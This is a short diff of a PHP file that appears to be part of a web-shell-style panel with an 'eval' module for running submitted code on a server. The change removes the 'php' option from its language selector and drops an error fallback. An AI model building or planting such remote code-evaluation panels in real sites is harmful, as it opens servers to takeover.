@@ -62,7 +62,7 @@ $GLOBALS['module']['eval']['content'] = "
 	<tr>
 		<td style='width:120px;'>
 			<select id='evalType'>
-				<option>php</option>
+				
 			</select>
 		</td>
 		<td colspan='3'>
@@ -406,7 +406,6 @@ elseif(isset($p['evalInput']) && isset($p['evalType'])){
 }
 elseif(isset($p['evalGetSupported'])){
 	$res = eval_get_supported();
-	if(empty($res)) $res = "error";
 	output($res);
 }
 ?>
